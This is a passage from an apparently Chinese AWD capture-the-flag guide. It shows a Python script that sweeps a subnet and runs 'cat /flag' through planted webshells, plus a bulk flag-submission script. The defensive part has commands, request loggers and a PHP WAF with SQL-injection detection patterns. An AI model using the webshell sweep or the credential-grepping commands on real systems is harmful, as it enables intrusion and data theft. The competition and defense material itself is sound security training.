class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url_head=<span class="hljs-string">&quot;http://xxx.xx.xxx.&quot;</span>    <span class="hljs-comment">#网段</span><br>url=<span class="hljs-string">&quot;&quot;</span><br>shell_addr=<span class="hljs-string">&quot;/Upload/index.php&quot;</span><br>passwd=<span class="hljs-string">&quot;xxxxx&quot;</span>                    <span class="hljs-comment">#木马密码</span><br>port=<span class="hljs-string">&quot;80&quot;</span><br>payload =  &#123;passwd: <span class="hljs-string">&#x27;system(&#x27;</span>cat /flag<span class="hljs-string">&#x27;);&#x27;</span>&#125;<br>webshelllist=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;webshelllist.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;firstround_flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">61</span>):<br>    url=url_head+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;:&quot;</span>+port+shell_addr<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.post(url,payload,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> res.status_code == requests.codes.ok:<br>            result = url+<span class="hljs-string">&quot; connect shell sucess,flag is &quot;</span>+res.text<br>            <span class="hljs-built_in">print</span> result<br>            <span class="hljs-built_in">print</span> &gt;&gt;flag,result<br>            <span class="hljs-built_in">print</span> &gt;&gt;webshelllist,url+<span class="hljs-string">&quot;,&quot;</span>+passwd<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shell 404&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span> url+<span class="hljs-string">&quot; connect shell fail&quot;</span><br>webshelllist.close()<br>flag.close()<br></code></pre></td></tr></table></figure><p>批量提交flag脚本（需根据要求自行修改）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> httplib<br>server_host = <span class="hljs-string">&#x27; &#x27;</span>    <span class="hljs-comment">#提交flag的服务器地址</span><br>server_port = <span class="hljs-number">80</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>(<span class="hljs-params">team_token, flag, host=server_host, port=server_port, timeout=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> team_token <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> flag:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;team token or flag wrong&#x27;</span>)<br>    conn = httplib.HTTPConnection(host, port, timeout=timeout)<br>    params = urllib.urlencode(&#123;        <span class="hljs-comment">#提交需要post的参数,根据情况修改</span><br>        <span class="hljs-string">&#x27;token&#x27;</span>: team_token,    <br>        <span class="hljs-string">&#x27;flag&#x27;</span>: flag,<br>    &#125;)<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencode&quot;</span><br>    &#125;<br>    conn.request(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;[submit_flag_dir]&#x27;</span>, params, headers)    <span class="hljs-comment">#第二个参数为提交flag的目录</span><br>    response = conn.getresponse()<br>    data = response.read()<br>    <span class="hljs-keyword">return</span> json.loads(data)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;usage: ./submitflag.py [team_token] [flag]&#x27;</span><br>        sys.exit()<br>    host = server_host<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">3</span>:<br>        host = sys.argv[<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span> json.dumps(submit(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>], host=host), indent=<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><h1 id="防御（DEFENSE）"><a href="#防御（DEFENSE）" class="headerlink" title="防御（DEFENSE）"></a>防御（DEFENSE）</h1><p>既然有攻击那么也需要防御别人的攻击，上面其实已经讲了一些防御的技巧了，比如修改弱口令，上传WAF等，这里就简单总结一下其他常用的知识吧。</p><h3 id="查找flag的位置"><a href="#查找flag的位置" class="headerlink" title="查找flag的位置"></a><strong>查找flag的位置</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><h3 id="查找password"><a href="#查找password" class="headerlink" title="查找password"></a><strong>查找password</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find .|xargs grep <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure><h3 id="查看以建立的连接和进程"><a href="#查看以建立的连接和进程" class="headerlink" title="查看以建立的连接和进程"></a><strong>查看以建立的连接和进程</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antulp | grep EST<br></code></pre></td></tr></table></figure><h3 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a><strong>结束进程</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> PID<br>killall &lt;进程名&gt;　　<br></code></pre></td></tr></table></figure><p><strong>检测TCP连接数量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash<br>复制代码netstat -ant|awk  |grep |sed -e  -e |<span class="hljs-built_in">sort</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -rn<br></code></pre></td></tr></table></figure><h3 id="chattr命令防止系统中某个关键文件被修改"><a href="#chattr命令防止系统中某个关键文件被修改" class="headerlink" title="chattr命令防止系统中某个关键文件被修改"></a><strong>chattr命令防止系统中某个关键文件被修改</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i /etc/resolv.conf<br></code></pre></td></tr></table></figure><h3 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a><strong>流量监控</strong></h3><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>在比赛机器上使用下述命令进行流量抓取：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">tcpdump -s <span class="hljs-number">0</span> -w flow_log.<span class="hljs-property">pcap</span> port <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>然后在本地对抓取的pcap使用wireshark进行分析</p><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>记录log的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<span class="hljs-comment">//记录访问者的ip</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];<span class="hljs-comment">//访问者要访问的文件名</span><br><span class="hljs-variable">$parameter</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;QUERY_STRING&quot;</span>];<span class="hljs-comment">//访问者要请求的参数</span><br><span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];<span class="hljs-comment">//请求方法</span><br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="hljs-title function_ invoke__">time</span>());<span class="hljs-comment">//访问时间</span><br><span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<span class="hljs-comment">//接收POST数据</span><br><span class="hljs-variable">$others</span> = <span class="hljs-string">&#x27;...其他你想得到的信息...&#x27;</span>;<br><span class="hljs-variable">$logadd</span> = <span class="hljs-string">&#x27;访问时间：&#x27;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&#x27;--&gt;&#x27;</span>.<span class="hljs-string">&#x27;访问链接：http://&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-variable">$parameter</span>.<span class="hljs-string">&#x27;请求方法：&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-comment">// log记录</span><br><span class="hljs-variable">$fh</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;log.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$logadd</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>,<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_COOKIE</span>, <span class="hljs-literal">true</span>).<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>,<span class="hljs-variable">$others</span>.<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当别人访问我们靶机时请求的URL可能就是攻击的payload,我们如果知道他们的请求就可以利用他们的手段来反打过去，这个基于流量监控来实现，一个简单的脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]; <span class="hljs-comment">//记录访问者的ip</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]; <span class="hljs-comment">//访问者要访问的文件名</span><br><span class="hljs-variable">$parameter</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;QUERY_STRING&quot;</span>]; <span class="hljs-comment">//访问者要请求的参数</span><br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="hljs-title function_ invoke__">time</span>()); <span class="hljs-comment">//访问时间</span><br><span class="hljs-variable">$logadd</span> = <span class="hljs-string">&#x27;来访时间：&#x27;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&#x27;--&gt;&#x27;</span>.<span class="hljs-string">&#x27;访问链接：&#x27;</span>.<span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-variable">$parameter</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-comment">// log记录</span><br><span class="hljs-variable">$fh</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;log.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$logadd</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="安装waf"><a href="#安装waf" class="headerlink" title="安装waf"></a><strong>安装waf</strong></h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例： <span class="hljs-built_in">find</span> /<span class="hljs-built_in">var</span>/www/html -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;*.php&quot;</span> | xargs sed -i <span class="hljs-string">&quot;s/&lt;?php/&lt;?php require_once(&#x27;\/tmp\/waf.php&#x27;);/g&quot;</span><br><span class="hljs-built_in">find</span> /<span class="hljs-built_in">var</span>/www/html -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;*.php&quot;</span> | xargs sed -i <span class="hljs-string">&quot;s/&lt;?php/&lt;?php require_once(&#x27;waf.php&#x27;);/g&quot;</span><br></code></pre></td></tr></table></figure><p>使用方法：</p><ol><li>将waf.php传到要包含的文件的目录</li><li>在页面中加入防护，有两种做法，根据情况二选一：<ul><li>PHPCMS V9：<code>\phpcms\base.php</code></li><li>PHPWIND8.7：<code>\data\sql_config.php</code></li><li>DEDECMS5.7：<code>\data\common.inc.php</code></li><li>DiscuzX2：<code>\config\config_global.php</code></li><li>Wordpress：<code>\wp-config.php</code></li><li>Metinfo：<code>\include\head.php</code></li><li>在所需要防护的页面加入代码：</li></ul></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;waf.php&#x27;</span>);<br></code></pre></td></tr></table></figure><ul><li>在每个文件最前加上上述代码 在<code>php.ini</code>中找到并添加：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Automatically add files before <span class="hljs-keyword">or</span> after any PHP document.<br>auto_prepend_file = waf.php的路径;<br></code></pre></td></tr></table></figure><ul><li>还有最简便的方法，可以用一条命令解决，以php为例：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find /var/www/html/path_you_want -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;*.php&quot;</span> | xargs sed -i <span class="hljs-string">&quot;s/&lt;?php/&lt;?php\nrequire_once(&#x27;\/tmp\/waf.php&#x27;);\n/g&quot;</span><br><span class="hljs-comment">#意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。</span><br></code></pre></td></tr></table></figure><h4 id="（1）waf"><a href="#（1）waf" class="headerlink" title="（1）waf"></a>（1）waf</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(E_ALL);</span><br><span class="hljs-comment">//ini_set(&#x27;display_errors&#x27;, 1);</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测请求方式，除了get和post之外拦截下来并写日志。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;method&quot;</span>);<br>&#125;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//获取uri来进行检测</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取post的data，无论是否是mutipa</span><br>rt <span class="hljs-variable">$headers</span> = <span class="hljs-title function_ invoke__">get_all_headers</span>(); <span class="hljs-comment">//获取header</span><br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$url</span>)))); <span class="hljs-comment">//</span><br>对URL进行检测，出现问题则拦截并记录<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$data</span>))));<br><span class="hljs-comment">//对POST的内容进行检测，出现问题拦截并记录</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测过了则对输入进行简单过滤</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//对http请求头进行检测，出现问题拦截并记录</span><br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//简单过滤</span><br>    <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http请求头并写入数组</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_all_headers</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;<br>            <span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$ascii</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ascii</span> &gt; <span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>) &#123; <span class="hljs-comment">//有中文这里要修改</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(<br>                <span class="hljs-number">9</span>,<br>                <span class="hljs-number">10</span>,<br>                <span class="hljs-number">13</span><br>            ))) &#123;<br>                <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;interrupt&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;`&quot;</span>,<br>        <span class="hljs-string">&quot;|&quot;</span>,<br>        <span class="hljs-string">&quot;;&quot;</span>,<br>        <span class="hljs-string">&quot;,&quot;</span><br>    ) , <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$str</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|delete\b|dumpfile\b</span><br><span class="hljs-string">|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|m</span><br><span class="hljs-string">ultipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;sqli&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ 